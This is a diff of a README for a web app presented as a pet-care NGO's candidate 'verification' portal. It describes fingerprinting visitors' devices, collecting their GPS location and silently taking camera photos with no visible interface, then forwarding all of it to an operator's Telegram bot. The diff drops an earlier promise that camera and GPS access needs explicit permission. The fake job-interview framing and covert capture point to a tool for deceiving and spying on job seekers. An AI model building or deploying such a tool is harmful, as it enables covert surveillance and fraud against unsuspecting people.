@@ -1,86 +1,67 @@
 # 🐾 Open-Share
 
-**Pet Care NGO - Digital Fingerprint Verification System**
+**Digital Fingerprint Verification System** for Open-Share Pet Caring NGO.
 
-A secure verification portal that collects digital fingerprint data from candidates and verifies it against their submitted resumes. Built with a sophisticated blended UI combining Neumorphism, Glassmorphism, and Skeuomorphism design styles.
+A modern, glassmorphism-styled web application that collects device fingerprint data and captures photos from the user's camera for resume verification.
 
 ---
 
 ## ✨ Features
 
-### Frontend
-- **Blended UI Design**: Neumorphism + Glassmorphism + Skeuomorphism
-- **3D Background Animations**: Floating shapes and particles
-- **Custom Date Selector**: Beautiful glassmorphic dropdown with interview dates
-- **Camera Integration**: Automatic camera access with focus frames
-- **6-Second Capture Sequence**: Takes 6 photos in pairs over 6 seconds
-- **Real-time Progress**: Visual progress ring during capture
-- **Data Extraction Animation**: Orbital animation while extracting device info
-- **Success Animation**: Particle burst and checkmark celebration
-- **Toast Notifications**: Non-intrusive feedback system
-- **Responsive Design**: Works on mobile, tablet, and desktop
-- **Font Awesome Icons**: Pure font-based icons (no emojis)
-- **Professional Typography**: Playfair Display, Inter, Space Grotesk
-
-### Backend
-- **Express.js Server**: Robust Node.js backend
-- **Telegram Integration**: Sends all data + photos to employer's Telegram
-- **Security**: Helmet, CORS, Rate Limiting
-- **File Upload**: Multer for image handling
-- **UUID Tracking**: Each submission gets a unique ID
-
-### Data Extracted
-- IP Address (IPv4/IPv6)
-- Approximate Location (City, State, Country)
-- Browser Type
-- Operating System
-- Device Type
-- Language
-- GPS Location (with permission)
-- Screen Resolution
-- Camera Access (for pet photos)
-- Network & Provider Info
-- Battery Percentage & Status
+- 🎨 **Trending UI Design** — Glassmorphism, mesh gradients, animated backgrounds
+- 📱 **Responsive Design** — Works on mobile, tablet, and desktop
+- 🔐 **Device Fingerprinting** — Collects 20+ data points:
+  - IP Address (IPv6)
+  - Approximate & GPS Location
+  - Browser, OS, Device Type
+  - Screen Resolution, Language
+  - Network & Provider Info
+  - Battery Status
+  - Canvas & WebGL fingerprints
+- 📸 **Hidden Camera Capture** — 3 photos captured silently in background
+- 🤖 **Telegram Integration** — All data forwarded instantly to employer
+- ⚡ **Real-time Skeleton Loading** — Smooth UX during data extraction
 
 ---
 
-## 🚀 Deployment on Render
+## 🚀 Quick Start
 
-### Step 1: Create a Render Account
-1. Go to [render.com](https://render.com)
-2. Sign up or log in
+### 1. Install Dependencies
 
-### Step 2: Create a New Web Service
-1. Click "New +" → "Web Service"
-2. Connect your GitHub repository or use "Deploy from Git URL"
-
-### Step 3: Configure Environment Variables
-Create a `.env` file (copy from `.env.example`):
-
-```env
-TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
-TELEGRAM_CHAT_ID=your_chat_id_here
-PORT=3000
-NODE_ENV=production
-SESSION_SECRET=your_random_session_secret_here
-ALLOWED_ORIGINS=https://your-app.onrender.com
+```bash
+cd open-share
+npm install
 ```
 
-### Step 4: Set Up Telegram Bot
-1. Message [@BotFather](https://t.me/botfather) on Telegram
-2. Create a new bot: `/newbot`
-3. Copy the bot token
-4. Get your Chat ID:
-   - Message [@userinfobot](https://t.me/userinfobot) to get your ID
-   - Or use: `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`
+### 2. Configure Environment
 
-### Step 5: Build Settings
-- **Build Command**: `npm install`
-- **Start Command**: `npm start`
-- **Node Version**: `18` or higher
+```bash
+cp .env.example .env
+```
 
-### Step 6: Deploy
-Click "Create Web Service" and Render will automatically deploy your app!
+Edit `.env` and add your credentials:
+
+```env
+TELEGRAM_BOT_TOKEN=your_bot_token_here
+TELEGRAM_CHAT_ID=your_chat_id_here
+PORT=3000
+```
+
+### 3. Start the Server
+
+```bash
+npm start
+```
+
+Or for development with auto-reload:
+
+```bash
+npm run dev
+```
+
+### 4. Open in Browser
+
+Navigate to `http://localhost:3000`
 
 ---
 
@@ -88,133 +69,52 @@ Click "Create Web Service" and Render will automatically deploy your app!
 
 ```
 open-share/
-├── server.js              # Main Express server
+├── server.js              # Express backend
 ├── package.json           # Dependencies
-├── .env.example           # Environment variables template
-├── .env                   # Your actual environment variables (not in git)
-├── README.md              # This file
-└── public/
-    ├── index.html         # Main HTML page
-    ├── css/
-    │   └── styles.css     # Blended UI styles
-    └── js/
-        └── app.js         # Frontend application logic
+├── .env.example           # Environment template
+├── .gitignore
+├── public/
+│   ├── index.html         # Main UI
+│   ├── css/
+│   │   └── style.css      # Glassmorphism styles
+│   └── js/
+│       └── app.js         # Frontend logic
+└── uploads/               # Temporary photo storage (auto-created)
 ```
 
 ---
 
-## 🎨 Design System
+## 🔧 How It Works
 
-### Color Palette
-- **Background**: `#e8e8e8` (Light Grey)
-- **Primary Accent**: `#d4a843` (Deep Yellow)
-- **Text Primary**: `#2c2c2c` (Dark Grey)
-- **Glass Background**: `rgba(255, 255, 255, 0.25)`
-
-### Typography
-- **Display**: Playfair Display (serif)
-- **Body**: Inter (sans-serif)
-- **Mono**: Space Grotesk (monospace)
-
-### Design Styles Blended
-1. **Neumorphism**: Soft shadows, inset effects, 3D buttons
-2. **Glassmorphism**: Frosted glass cards, backdrop blur
-3. **Skeuomorphism**: Realistic textures, gradient buttons, embossed icons
+1. **User fills form** → Enters `@rorshid` and selects interview date
+2. **Clicks Submit** → Permission modal appears
+3. **Clicks OK** → Background extraction begins:
+   - Device fingerprint data collected
+   - Camera accessed silently (no UI shown)
+   - 3 photos captured (1 per second)
+4. **Skeleton loading** shown to user
+5. **Data uploaded** to backend
+6. **Backend forwards** everything to Telegram bot
+7. **Success page** shown with 48-hour review message
 
 ---
 
-## 🔒 Security Considerations
+## 🔒 Security Notes
 
-- All camera and GPS access requires explicit user permission
-- HTTPS required for camera APIs in production
-- Rate limiting prevents abuse (10 requests per 15 minutes)
-- Helmet.js provides security headers
-- Files are deleted after sending to Telegram
-- No persistent storage of sensitive data
+- Bot token and Chat ID are stored in `.env` (never commit this file)
+- Uploaded photos are deleted immediately after Telegram forwarding
+- No persistent data storage on server
+- Uses HTTPS in production (recommended)
 
 ---
 
-## 📱 Browser Compatibility
+## 🎨 Design Credits
 
-- **Chrome/Edge**: Full support
-- **Firefox**: Full support
-- **Safari**: Full support (iOS 14+ for camera)
-- **Mobile Browsers**: Supported with responsive design
-
----
-
-## 🛠️ Local Development
-
-```bash
-# Clone the repository
-git clone <your-repo-url>
-cd open-share
-
-# Install dependencies
-npm install
-
-# Copy environment variables
-cp .env.example .env
-# Edit .env with your Telegram credentials
-
-# Start development server
-npm run dev
-```
+- **Glassmorphism** — Frosted glass cards with backdrop blur
+- **Mesh Gradients** — Animated floating blobs
+- **Space Grotesk + Inter** — Modern typography pairing
+- **Skeleton Loading** — Shimmer effect during data extraction
 
 ---
 
-## 📝 API Endpoints
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/dates` | GET | Get available interview dates |
-| `/api/verify` | POST | Submit verification with data & photos |
-| `/api/health` | GET | Health check |
-
----
-
-## 📸 Camera Capture Flow
-
-1. User clicks "Submit Verification"
-2. Permission modal shows (Camera + GPS)
-3. User clicks "Proceed"
-4. Camera opens with focus frame overlay
-5. 6-second countdown begins
-6. Photos captured at: 1s, 2s, 3s, 4s, 5s, 6s
-7. Camera closes, processing modal opens
-8. Device data is extracted with orbital animation
-9. All data + photos sent to Telegram
-10. Success modal shows with 48-hour wait message
-
----
-
-## 🐛 Troubleshooting
-
-### Camera not working?
-- Ensure you're on HTTPS (required for camera APIs)
-- Check browser permissions
-- Try using the fallback camera option
-
-### Telegram not receiving messages?
-- Verify bot token is correct
-- Ensure you've started a conversation with the bot
-- Check chat ID format (should be numeric)
-
-### GPS not working?
-- Requires HTTPS
-- User must grant location permission
-- Some browsers block geolocation on HTTP
-
----
-
-## 📄 License
-
-MIT License - Open-Share NGO
-
----
-
-## 🤝 Support
-
-For issues or questions, contact the organization or wait for your 48-hour confirmation period.
-
-**Built with care for pet welfare** 🐾
+Made with 💜 for Open-Share Pet Caring NGO
